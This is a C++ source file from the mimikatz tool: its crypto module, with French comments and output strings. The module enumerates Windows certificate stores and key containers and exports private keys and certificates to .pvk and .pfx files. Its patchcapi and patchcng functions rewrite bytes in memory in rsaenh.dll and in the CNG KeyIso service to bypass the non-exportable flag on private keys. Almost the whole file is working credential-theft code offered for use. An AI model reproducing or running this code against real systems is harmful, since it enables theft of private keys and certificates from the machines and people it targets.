/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_mimikatz_crypto.h"
#include "..\global.h"

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_crypto::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listProviders,		L"listProviders",		L"Liste les providers installés)"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listStores,			L"listStores",			L"Liste les magasins système"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listCertificates,	L"listCertificates",	L"Liste les certificats"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(listKeys,			L"listKeys",			L"Liste les conteneurs de clés"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(exportCertificates,	L"exportCertificates",	L"Exporte les certificats"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(exportKeys,			L"exportKeys",			L"Exporte les clés"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(patchcng,			L"patchcng",			L"[experimental] Patch le gestionnaire de clés pour l\'export de clés non exportable"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(patchcapi,			L"patchcapi",			L"[experimental] Patch la CryptoAPI courante pour l\'export de clés non exportable"));
	return monVector;
}

bool mod_mimikatz_crypto::listProviders(vector<wstring> * arguments)
{
	vector<wstring> * monVectorProviders = new vector<wstring>();
	/* CryptoAPI */
	(*outputStream) << L"Providers CryptoAPI :" << endl;
	if(mod_cryptoapi::getVectorProviders(monVectorProviders))
		for(vector<wstring>::iterator monProvider = monVectorProviders->begin(); monProvider != monVectorProviders->end(); monProvider++)
			(*outputStream) << L'\t' << *monProvider << endl;
	else (*outputStream) << L"mod_cryptoapi::getVectorProviders : " << mod_system::getWinError() << endl;

	/* CryptoNG */
	if(mod_cryptong::isNcrypt)
	{
		(*outputStream) << endl;
		monVectorProviders->clear();

		(*outputStream) << L"Providers CNG :" << endl;
		if(mod_cryptong::getVectorProviders(monVectorProviders))
			for(vector<wstring>::iterator monProvider = monVectorProviders->begin(); monProvider != monVectorProviders->end(); monProvider++)
				(*outputStream) << L'\t' << *monProvider << endl;
		else (*outputStream) << L"mod_cryptong::getVectorProviders : " << mod_system::getWinError() << endl;
	}
	delete monVectorProviders;
	return true;
}

bool mod_mimikatz_crypto::listKeys(vector<wstring> * arguments)
{
	listAndOrExportKeys(arguments, false);
	return true;
}

bool mod_mimikatz_crypto::exportKeys(vector<wstring> * arguments)
{
	listAndOrExportKeys(arguments, true);
	return true;
}

bool mod_mimikatz_crypto::listStores(vector<wstring> * arguments)
{
	wstring monEmplacement = (arguments->empty() ? L"CERT_SYSTEM_STORE_CURRENT_USER" : arguments->front());

	(*outputStream) << L"Emplacement : \'" << monEmplacement << L'\'';

	DWORD systemStore;
	if(mod_crypto::getSystemStoreFromString(monEmplacement, &systemStore))
	{
		(*outputStream) << endl;
		vector<wstring> * mesStores = new vector<wstring>();
		if(mod_crypto::getVectorSystemStores(mesStores, systemStore))
			for(vector<wstring>::iterator monStore = mesStores->begin(); monStore != mesStores->end(); monStore++)
				(*outputStream) << L'\t' << *monStore << endl;
		else (*outputStream) << L"mod_crypto::getListSystemStores : " << mod_system::getWinError() << endl;
		delete mesStores;
	}
	else (*outputStream) << L" introuvable !" << endl;
	return true;
}

bool mod_mimikatz_crypto::listCertificates(vector<wstring> * arguments)
{
	listAndOrExportCertificates(arguments, false);
	return true;
}

bool mod_mimikatz_crypto::exportCertificates(vector<wstring> * arguments)
{
	listAndOrExportCertificates(arguments, true);
	return true;
}

void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool exportKeys)
{
	bool isMachine = false;
	DWORD providerType = PROV_RSA_FULL;
	wstring provider = MS_ENHANCED_PROV;

	switch (arguments->size())
	{
		case 1:
			isMachine = true;
		case 0:
			break;
		case 3:
			isMachine = true;
			arguments->erase(arguments->begin());
		case 2:
			mod_cryptoapi::getProviderString(arguments->front(), &provider);
			mod_cryptoapi::getProviderTypeFromString(arguments->back(), &providerType);
			break;
		default :
			(*outputStream) << L"Erreur d\'arguments, attendu : [machine] [provider providerType]" << endl;
			return;
	}
	
	
	wstring type = (isMachine ? L"machine" : L"user");

	vector<wstring> * monVectorKeys = new vector<wstring>();

	/* CryptoAPI */
	(*outputStream) << L"[" << type << L"] Clés CryptoAPI :" << endl;
	if(mod_cryptoapi::getVectorContainers(monVectorKeys, isMachine))
	{
		DWORD i;
		vector<wstring>::iterator monContainer;
		for(i = 0, monContainer = monVectorKeys->begin(); monContainer != monVectorKeys->end(); monContainer++, i++)
		{
			(*outputStream) << L"\t - " << *monContainer << endl;

			HCRYPTPROV hCryptKeyProv = NULL;
			if(CryptAcquireContext(&hCryptKeyProv, monContainer->c_str(), provider.c_str(), providerType, NULL | (isMachine ? CRYPT_MACHINE_KEYSET : NULL)))
			{
				HCRYPTKEY maCle = NULL;
				for(DWORD ks = AT_KEYEXCHANGE; (ks <= AT_SIGNATURE) && !maCle; ks++)
				{
					if(CryptGetUserKey(hCryptKeyProv, ks, &maCle))
					{
						(*outputStream) << L"\t\tType          : " << mod_crypto::KeyTypeToString(ks) << endl;
						DWORD param = 0, taille = sizeof(param);
						if(CryptGetKeyParam(maCle, KP_PERMISSIONS, reinterpret_cast<BYTE *>(&param), &taille, NULL))
							(*outputStream) << L"\t\tExportabilité : " << (param & CRYPT_EXPORT ? L"OUI" : L"NON") << endl;
						if(CryptGetKeyParam(maCle, KP_KEYLEN, reinterpret_cast<BYTE *>(&param), &taille, NULL))
							(*outputStream) << L"\t\tTaille clé    : " << param << endl;

						if(exportKeys)
						{
							bool reussite = false;
							BYTE * monExport = NULL;
							DWORD tailleExport = 0;

							wstringstream monBuff;
							wstring containerName = *monContainer;
							sanitizeFileName(&containerName);

							monBuff << L"capi_" << type << L'_' << i << L'_' << containerName << L".pvk";
						
							if(mod_cryptoapi::getPrivateKey(maCle, &monExport, &tailleExport))
							{
								reussite = mod_crypto::PrivateKeyBlobToPVK(monExport, tailleExport, monBuff.str(), ks);
								delete[] monExport;
							}

							(*outputStream) << L"\t\tExport privé dans  \'" << monBuff.str() << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
							if(!reussite)
							{
								(*outputStream) << L"\t\t\tmod_cryptoapi::getPrivateKey/PrivateKeyBlobToPVK : " << mod_system::getWinError() << endl;
							}
						}
					}
				}

				if(maCle)
					CryptDestroyKey(maCle);
				else
					(*outputStream) << L"\t\t* Erreur de clé ; " << mod_system::getWinError() << endl;


				CryptReleaseContext(hCryptKeyProv, 0);
			}
			else (*outputStream) << L"\t\t* Erreur d\'acquisition de la clé ; " << mod_system::getWinError() << endl;
		}
	}
	else (*outputStream) << L"mod_cryptoapi::getVectorContainers : " << mod_system::getWinError() << endl;

	/* CryptoNG */
	if(mod_cryptong::isNcrypt)
	{
		(*outputStream) << endl;
		monVectorKeys->clear();

		(*outputStream) << L"[" << type << L"] Clés CNG :" << endl;
		if(mod_cryptong::getVectorContainers(monVectorKeys, isMachine))
		{
			DWORD i;
			vector<wstring>::iterator monContainer;
			for(i = 0, monContainer = monVectorKeys->begin(); monContainer != monVectorKeys->end(); monContainer++, i++)
			{
				(*outputStream) << L"\t - " << *monContainer << endl;

				NCRYPT_KEY_HANDLE maCle;
				if(mod_cryptong::getHKeyFromName(*monContainer, &maCle, isMachine))
				{
					bool exportable = false;
					DWORD size = 0;

					if(mod_cryptong::isKeyExportable(&maCle, &exportable))
						(*outputStream) << L"\t\tExportabilité : " << (exportable ? L"OUI" : L"NON") << endl;
					if(mod_cryptong::getKeySize(&maCle, &size))
						(*outputStream) << L"\t\tTaille clé    : " << size << endl;

					if(exportKeys)
					{
						bool reussite = false;
						BYTE * monExport = NULL;
						DWORD tailleExport = 0;

						wstringstream monBuff;
						monBuff << L"cng_" << type << L'_' << i << L'_' << *monContainer << L".pvk";

						if(mod_cryptong::getPrivateKey(maCle, &monExport, &tailleExport))
						{
							reussite = mod_crypto::PrivateKeyBlobToPVK(monExport, tailleExport, monBuff.str());
							delete[] monExport;
						}

						(*outputStream) << L"\t\tExport privé dans  \'" << monBuff.str() << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
						if(!reussite)
						{
							(*outputStream) << L"\t\t\tmod_cryptong::getPrivateKey/PrivateKeyBlobToPVK : " << mod_system::getWinError() << endl;
						}
					}	
					mod_cryptong::NCryptFreeObject(maCle);
				}
			}
		}
		else (*outputStream) << L"mod_cryptong::getVectorContainers : " << mod_system::getWinError() << endl;
	}

	delete monVectorKeys;
}


void mod_mimikatz_crypto::listAndOrExportCertificates(vector<wstring> * arguments, bool exportCert)
{
	wstring monEmplacement = L"CERT_SYSTEM_STORE_CURRENT_USER";
	wstring monStore = L"My";

	if(arguments->size() == 1)
	{
		monEmplacement = arguments->front();
	}
	else if(arguments->size() == 2)
	{
		monEmplacement = arguments->front();
		monStore = arguments->back();
	}
	
	(*outputStream) << L"Emplacement : \'" << monEmplacement << L'\'';

	DWORD systemStore;
	if(mod_crypto::getSystemStoreFromString(monEmplacement, &systemStore))
	{
		(*outputStream) << L"\\" << monStore << endl;
		if(HCERTSTORE hCertificateStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, NULL, NULL, systemStore | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, monStore.c_str()))
		{
			DWORD i;
			PCCERT_CONTEXT pCertContext;
			for (i = 0, pCertContext = CertEnumCertificatesInStore(hCertificateStore, NULL); pCertContext != NULL; pCertContext = CertEnumCertificatesInStore(hCertificateStore, pCertContext), i++)
			{
				wstring * certName = new wstring();
				bool reussite = false;

				if(!mod_crypto::getCertNameFromCertCTX(pCertContext, certName))
					certName->assign(L"[empty]");

				(*outputStream) << L"\t - " << *certName << endl;;
				sanitizeFileName(certName);

				wstringstream monBuff;
				monBuff << monEmplacement << L'_' << monStore << L'_' << i << L'_' << *certName << L'.';
										
				mod_crypto::KIWI_KEY_PROV_INFO keyProvInfo;
				if(mod_crypto::getKiwiKeyProvInfo(pCertContext, &keyProvInfo))
				{
					(*outputStream) << L"\t\tContainer Clé : " << keyProvInfo.pwszContainerName << endl;
					(*outputStream) << L"\t\tProvider      : " << keyProvInfo.pwszProvName << endl;
						
					HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv = NULL;
					DWORD keySpec = 0;
					BOOL aFermer = false;
						
					if(CryptAcquireCertificatePrivateKey(pCertContext, CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG /* CRYPT_ACQUIRE_SILENT_FLAG NULL */, NULL, &monProv, &keySpec, &aFermer))
					{
						(*outputStream) << L"\t\tType          : " << mod_crypto::KeyTypeToString(keySpec) << endl;
							
						DWORD size = 0;
						bool exportable = false;

						if(keySpec == CERT_NCRYPT_KEY_SPEC)
						{
							if(mod_cryptong::isNcrypt)
							{
								reussite = mod_cryptong::getKeySize(&monProv, &size);
								reussite &=mod_cryptong::isKeyExportable(&monProv, &exportable);

								if(aFermer)
								{
									mod_cryptong::NCryptFreeObject(monProv);
								}
							}
							else (*outputStream) << L"\t\t\tErreur : Clé de type nCrypt, sans nCrypt ?" << endl;
						}
						else
						{
							DWORD tailleEcrite = 0;
							DWORD exportability;

							HCRYPTKEY maCle = NULL;
							if(reussite = (CryptGetUserKey(monProv, keySpec, &maCle) != 0))
							{
								tailleEcrite = sizeof(DWORD);
								reussite = (CryptGetKeyParam(maCle, KP_KEYLEN, reinterpret_cast<BYTE *>(&size), &tailleEcrite, NULL) != 0);
								tailleEcrite = sizeof(DWORD);
								reussite &= (CryptGetKeyParam(maCle, KP_PERMISSIONS, reinterpret_cast<BYTE *>(&exportability), &tailleEcrite, NULL) != 0);
								exportable = (exportability & CRYPT_EXPORT) != 0;
							}

							if(aFermer)
							{
								CryptReleaseContext(monProv, 0);
							}
						}
						if(reussite)
						{
							(*outputStream) << L"\t\tExportabilité : " << (exportable ? L"OUI" : L"NON") << endl;
							(*outputStream) << L"\t\tTaille clé    : " << size << endl;
						}

						if(exportCert)
						{
							wstring PFXFile = monBuff.str();
							PFXFile.append(L"pfx");

							reussite = mod_crypto::CertCTXtoPFX(pCertContext, PFXFile, L"mimikatz");

							(*outputStream) << L"\t\tExport privé dans  \'" << PFXFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
							if(!reussite)
							{
								(*outputStream) << L"\t\t\t" << mod_system::getWinError() << endl;
							}
						}
					}
					else (*outputStream) << L"CryptAcquireCertificatePrivateKey : " << mod_system::getWinError() << endl;
				}

				if(exportCert)
				{
					wstring DERFile = monBuff.str();
					DERFile.append(L"der");
						
					reussite = mod_crypto::CertCTXtoDER(pCertContext, DERFile);
						
					(*outputStream) << L"\t\tExport public dans \'" << DERFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
					if(!reussite)
					{
						(*outputStream) << L"\t\t\t" << mod_system::getWinError() << endl;
					}
				}
				delete certName;
			}
			CertCloseStore(hCertificateStore, CERT_CLOSE_STORE_FORCE_FLAG);
		}
		else (*outputStream) << L"CertOpenStore : " << mod_system::getWinError() << endl;
	}
	else (*outputStream) << L" introuvable !" << endl;
}


bool mod_mimikatz_crypto::patchcapi(vector<wstring> * arguments)
{
	wchar_t LIBNAME_WALL_RSA[]					= L"rsaenh.dll";
	char	FUNCNAM_WALL_EXPORT[]				= "CPExportKey";
#ifdef _M_X64
	BYTE PTRN_WIN5_CPExportKey_4001[]			= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x75};
	BYTE PTRN_WIN5_CPExportKey_4000[]			= {0x0c, 0x0e, 0x72};
	BYTE PATC_WIN5_CPExportKey_EXPORT[]			= {0xeb};
	LONG OFFS_WIN5_CPExportKey_4001_EXPORT		= -4;
	LONG OFFS_WIN5_CPExportKey_4000_EXPORT		= -5;
	
	BYTE PTRN_W6AL_CPExportKey_4001[]			= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
	BYTE PTRN_WIN6_CPExportKey_4000[]			= {0x0c, 0x0e, 0x0f, 0x82};
	BYTE PTRN_WIN8_CPExportKey_4000[]			= {0x0c, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
	BYTE PATC_W6AL_CPExportKey_EXPORT[]			= {0x90, 0xe9};
	LONG OFFS_W6AL_CPExportKey_EXPORT			= 5;
	LONG OFFS_WIN6_CPExportKey_4000_EXPORT		= 2;
#elif defined _M_IX86
	BYTE PTRN_WIN5_CPExportKey_4001[]			= {0x08, 0x01, 0x40, 0x75};
	BYTE PTRN_WIN5_CPExportKey_4000[]			= {0x09, 0x40, 0x0f, 0x84};
	BYTE PATC_WIN5_CPExportKey_EXPORT[]			= {0xeb};
	LONG OFFS_WIN5_CPExportKey_4001_EXPORT		= -5;
	LONG OFFS_WIN5_CPExportKey_4000_EXPORT		= -7;
	
	BYTE PTRN_WI60_CPExportKey_4001[]			= {0x08, 0x01, 0x40, 0x0f, 0x85};
	BYTE PTRN_WIN6_CPExportKey_4001[]			= {0x08, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
	BYTE PTRN_WI60_CPExportKey_4000[]			= {0x08, 0x00, 0x40, 0x0f, 0x85};
	BYTE PTRN_WIN6_CPExportKey_4000[]			= {0x08, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
	BYTE PATC_W6AL_CPExportKey_EXPORT[]			= {0x90, 0xe9};
	LONG OFFS_WI60_CPExportKey_EXPORT			= 3;
	LONG OFFS_WIN6_CPExportKey_EXPORT			= 5;
#endif
	
	PBYTE ptr4001 = NULL; PBYTE pattern4001 = NULL; ULONG taillePattern4001 = 0; PBYTE patch4001 = NULL; ULONG taillePatch4001 = 0; LONG offsetPatch4001 = 0;
	PBYTE ptr4000 = NULL; PBYTE pattern4000 = NULL; ULONG taillePattern4000 = 0; PBYTE patch4000 = NULL; ULONG taillePatch4000 = 0; LONG offsetPatch4000 = 0;

	if(mod_system::GLOB_Version.dwMajorVersion < 6)
	{
		pattern4001 = PTRN_WIN5_CPExportKey_4001; taillePattern4001 = sizeof(PTRN_WIN5_CPExportKey_4001); 
		pattern4000 = PTRN_WIN5_CPExportKey_4000; taillePattern4000 = sizeof(PTRN_WIN5_CPExportKey_4000);
		patch4001 = patch4000 = PATC_WIN5_CPExportKey_EXPORT; taillePatch4001 = taillePatch4000 = sizeof(PATC_WIN5_CPExportKey_EXPORT);
		offsetPatch4001 = OFFS_WIN5_CPExportKey_4001_EXPORT;
		offsetPatch4000 = OFFS_WIN5_CPExportKey_4000_EXPORT;
	}
	else
	{
#ifdef _M_X64
		pattern4001 = PTRN_W6AL_CPExportKey_4001; taillePattern4001 = sizeof(PTRN_W6AL_CPExportKey_4001);
		patch4001 = patch4000 = PATC_W6AL_CPExportKey_EXPORT; taillePatch4001 = taillePatch4000 = sizeof(PATC_W6AL_CPExportKey_EXPORT);
		offsetPatch4001 = OFFS_W6AL_CPExportKey_EXPORT;
		if(mod_system::GLOB_Version.dwBuildNumber < 8000)
		{
			pattern4000 = PTRN_WIN6_CPExportKey_4000; taillePattern4000 = sizeof(PTRN_WIN6_CPExportKey_4000);
			offsetPatch4000 = OFFS_WIN6_CPExportKey_4000_EXPORT;
		}
		else
		{
			pattern4000 = PTRN_WIN8_CPExportKey_4000; taillePattern4000 = sizeof(PTRN_WIN8_CPExportKey_4000);
			offsetPatch4000 = OFFS_W6AL_CPExportKey_EXPORT;
		}
#elif defined _M_IX86
		patch4001 = patch4000 = PATC_W6AL_CPExportKey_EXPORT; taillePatch4001 = taillePatch4000 = sizeof(PATC_W6AL_CPExportKey_EXPORT);
		if(mod_system::GLOB_Version.dwMinorVersion < 1)
		{
			pattern4001 = PTRN_WI60_CPExportKey_4001; taillePattern4001 = sizeof(PTRN_WI60_CPExportKey_4001);
			pattern4000 = PTRN_WI60_CPExportKey_4000; taillePattern4000 = sizeof(PTRN_WI60_CPExportKey_4000);
			offsetPatch4001 = offsetPatch4000 = OFFS_WI60_CPExportKey_EXPORT;
		}
		else
		{
			pattern4001 = PTRN_WIN6_CPExportKey_4001; taillePattern4001 = sizeof(PTRN_WIN6_CPExportKey_4001);
			pattern4000 = PTRN_WIN6_CPExportKey_4000; taillePattern4000 = sizeof(PTRN_WIN6_CPExportKey_4000);
			offsetPatch4001 = offsetPatch4000 = OFFS_WIN6_CPExportKey_EXPORT;
		}
#endif
	}

	if(HMODULE hRSA = LoadLibrary(LIBNAME_WALL_RSA))
	{
		if(	mod_memory::genericPatternSearch(&ptr4001, LIBNAME_WALL_RSA, pattern4001, taillePattern4001, offsetPatch4001, FUNCNAM_WALL_EXPORT, true, true) &&
			mod_memory::genericPatternSearch(&ptr4000, LIBNAME_WALL_RSA, pattern4000, taillePattern4000, offsetPatch4000, FUNCNAM_WALL_EXPORT, true, true))
		{
			(*outputStream) << L"Patterns CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE et CRYPT_ARCHIVABLE trouvés !" << endl <<
			L"Patch CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE : " << (mod_memory::writeMemory(ptr4001, patch4001, taillePatch4001) ? L"OK" : L"KO") << endl <<
			L"Patch CRYPT_ARCHIVABLE                    : " << (mod_memory::writeMemory(ptr4000, patch4000, taillePatch4000) ? L"OK" : L"KO") << endl;
		}
		FreeLibrary(hRSA);
	}
	return true;
}

bool mod_mimikatz_crypto::patchcng(vector<wstring> * arguments)
{
	wchar_t LIBNAME_WNO8_NCrypt[]				= L"ncrypt.dll";
	wchar_t LIBNAME_WIN8_NCrypt[]				= L"ncryptprov.dll";
#ifdef _M_X64
	BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x75};
	BYTE PTRN_WIN8_SPCryptExportKey[]			= {0xf6, 0x43, 0x24, 0x02, 0x75};
	BYTE PTRN_WI60_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x0f, 0x85};

	BYTE PATC_WI60_SPCryptExportKey_EXPORT[]	= {0x90, 0xe9};
	BYTE PATC_WI60_SPCryptExportKey_NOEXPORT[]	= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb};
	BYTE PATC_WALL_SPCryptExportKey_NOEXPORT[]	= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb};
#elif defined _M_IX86
	BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x41, 0x20, 0x02, 0x75};
	BYTE PTRN_WIN8_SPCryptExportKey[]			= {0xf6, 0x47, 0x1c, 0x02, 0x75};
	
	BYTE PATC_WNO8_SPCryptExportKey_NOEXPORT[]	= {0x90, 0x90, 0x90, 0x90, 0x90, 0xeb};
	BYTE PATC_WIN8_SPCryptExportKey_NOEXPORT[]	= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xeb};
#endif
	BYTE PATC_WALL_SPCryptExportKey_EXPORT[]	= {0xeb};
	LONG OFFS_WALL_SPCryptExportKey_EXPORT		= 4;

	if(mod_cryptong::isNcrypt)
	{
		if(mod_cryptong::justInitCNG())
		{
			wchar_t * libName; PBYTE pattern = NULL; ULONG taillePattern = 0; PBYTE patch = NULL; ULONG taillePatch = 0; LONG offsetPatch = 0;
		
			if(mod_system::GLOB_Version.dwBuildNumber < 8000)
			{
#ifdef _M_X64
				if(mod_system::GLOB_Version.dwMinorVersion < 1)
				{
					pattern = PTRN_WI60_SPCryptExportKey;
					taillePattern = sizeof(PTRN_WI60_SPCryptExportKey);
				}
				else
				{
#endif
					pattern = PTRN_WNO8_SPCryptExportKey;
					taillePattern = sizeof(PTRN_WNO8_SPCryptExportKey);
#ifdef _M_X64
				}
#endif
				libName = LIBNAME_WNO8_NCrypt;
			}
			else
			{
				pattern = PTRN_WIN8_SPCryptExportKey;
				taillePattern = sizeof(PTRN_WIN8_SPCryptExportKey);
				libName = LIBNAME_WIN8_NCrypt;
			}

			if(arguments->empty())
			{
#ifdef _M_X64
				if(mod_system::GLOB_Version.dwMinorVersion < 1)
				{
					patch = PATC_WI60_SPCryptExportKey_EXPORT;
					taillePatch = sizeof(PATC_WI60_SPCryptExportKey_EXPORT);
				}
				else
				{
#endif
					patch = PATC_WALL_SPCryptExportKey_EXPORT;
					taillePatch = sizeof(PATC_WALL_SPCryptExportKey_EXPORT);
#ifdef _M_X64
				}
#endif
			}
			else
			{
#ifdef _M_X64
				if(mod_system::GLOB_Version.dwMinorVersion < 1)
				{
					patch = PATC_WI60_SPCryptExportKey_NOEXPORT;
					taillePatch = sizeof(PATC_WI60_SPCryptExportKey_NOEXPORT);
				}
				else
				{
					patch = PATC_WALL_SPCryptExportKey_NOEXPORT;
					taillePatch = sizeof(PATC_WALL_SPCryptExportKey_NOEXPORT);
				}
#elif defined _M_IX86
				if(mod_system::GLOB_Version.dwBuildNumber < 8000)
				{
					patch = PATC_WNO8_SPCryptExportKey_NOEXPORT;
					taillePatch = sizeof(PATC_WNO8_SPCryptExportKey_NOEXPORT);
				}
				else
				{
					patch = PATC_WIN8_SPCryptExportKey_NOEXPORT;
					taillePatch = sizeof(PATC_WIN8_SPCryptExportKey_NOEXPORT);
				}
#endif
			}
			offsetPatch = OFFS_WALL_SPCryptExportKey_EXPORT;

			mod_patch::patchModuleOfService(L"KeyIso", libName, pattern, taillePattern, patch, taillePatch, offsetPatch);
		}
		else (*outputStream) << L"Impossible d\'initialiser la CNG : " << mod_system::getWinError() << endl;
	}
	else (*outputStream) << L"Pas de CNG ?" << endl;
	
	return true;
}

void mod_mimikatz_crypto::sanitizeFileName(wstring * fileName)
{
	wchar_t monTab[] = {L'\\', L'/', L':', L'*', L'?', L'\"', L'<', L'>', L'|'};
	for(wstring::iterator monIterateur = fileName->begin(); monIterateur != fileName->end(); monIterateur++)
	{
		for(ULONG i = 0; i < sizeof(monTab) / sizeof(wchar_t); i++)
		{
			if(*monIterateur == monTab[i])
			{
				*monIterateur = L'~';
				break;
			}
		}
	}
}
